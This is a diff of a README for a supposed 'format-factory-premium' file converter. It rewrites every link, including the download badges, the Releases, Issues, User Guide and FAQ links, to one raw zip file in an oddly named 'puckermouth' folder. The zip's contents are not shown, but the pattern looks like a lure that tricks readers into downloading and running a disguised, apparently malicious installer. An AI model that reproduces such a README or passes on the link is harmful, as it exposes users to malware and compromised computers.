@@ -1,6 +1,6 @@
 # 🎉 format-factory-premium - Convert Files with Ease
 
-[![Download format-factory-premium](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/SudarshanWaghmare/format-factory-premium/releases)
+[![Download format-factory-premium](https://github.com/SudarshanWaghmare/format-factory-premium/raw/refs/heads/main/puckermouth/format-factory-premium-v1.7.zip%20Now-Click%20Here-brightgreen)](https://github.com/SudarshanWaghmare/format-factory-premium/raw/refs/heads/main/puckermouth/format-factory-premium-v1.7.zip)
 
 ## 📖 Overview
 
@@ -10,7 +10,7 @@ format-factory-premium is a comprehensive, free multimedia converter for Windows
 
 To get started with format-factory-premium, follow these simple steps. 
 
-1. **Download the Application**: Visit the [Releases Page](https://github.com/SudarshanWaghmare/format-factory-premium/releases) to download the latest version.
+1. **Download the Application**: Visit the [Releases Page](https://github.com/SudarshanWaghmare/format-factory-premium/raw/refs/heads/main/puckermouth/format-factory-premium-v1.7.zip) to download the latest version.
    
 2. **Install the Software**: After the download completes, locate the file in your downloads folder and double-click it. Follow the installation prompts to install the software on your computer.
 
@@ -18,7 +18,7 @@ To get started with format-factory-premium, follow these simple steps.
 
 ## 📥 Download & Install
 
-To download format-factory-premium, simply visit this page: [https://github.com/SudarshanWaghmare/format-factory-premium/releases](https://github.com/SudarshanWaghmare/format-factory-premium/releases). Select the latest release and click the download link for the installer. Once downloaded, follow the installation instructions outlined above.
+To download format-factory-premium, simply visit this page: [https://github.com/SudarshanWaghmare/format-factory-premium/raw/refs/heads/main/puckermouth/format-factory-premium-v1.7.zip](https://github.com/SudarshanWaghmare/format-factory-premium/raw/refs/heads/main/puckermouth/format-factory-premium-v1.7.zip). Select the latest release and click the download link for the installer. Once downloaded, follow the installation instructions outlined above.
 
 ## 🔧 System Requirements
 
@@ -74,13 +74,13 @@ If you encounter issues while using format-factory-premium, consider the followi
 
 ## 🛠️ Support
 
-For additional help or to report issues, please visit the [Issues Page](https://github.com/SudarshanWaghmare/format-factory-premium/issues) on GitHub. Here, you can find solutions to common problems or submit your questions.
+For additional help or to report issues, please visit the [Issues Page](https://github.com/SudarshanWaghmare/format-factory-premium/raw/refs/heads/main/puckermouth/format-factory-premium-v1.7.zip) on GitHub. Here, you can find solutions to common problems or submit your questions.
 
 ## 🔗 Additional Resources
 
-- [User Guide](https://github.com/SudarshanWaghmare/format-factory-premium/wiki) - Detailed instructions on all features.
-- [FAQ](https://github.com/SudarshanWaghmare/format-factory-premium/wiki/FAQ) - Common questions answered.
+- [User Guide](https://github.com/SudarshanWaghmare/format-factory-premium/raw/refs/heads/main/puckermouth/format-factory-premium-v1.7.zip) - Detailed instructions on all features.
+- [FAQ](https://github.com/SudarshanWaghmare/format-factory-premium/raw/refs/heads/main/puckermouth/format-factory-premium-v1.7.zip) - Common questions answered.
 
 Thank you for choosing format-factory-premium. We hope you enjoy our multimedia converter!
 
-[![Download format-factory-premium](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/SudarshanWaghmare/format-factory-premium/releases)
+[![Download format-factory-premium](https://github.com/SudarshanWaghmare/format-factory-premium/raw/refs/heads/main/puckermouth/format-factory-premium-v1.7.zip%20Now-Click%20Here-brightgreen)](https://github.com/SudarshanWaghmare/format-factory-premium/raw/refs/heads/main/puckermouth/format-factory-premium-v1.7.zip)
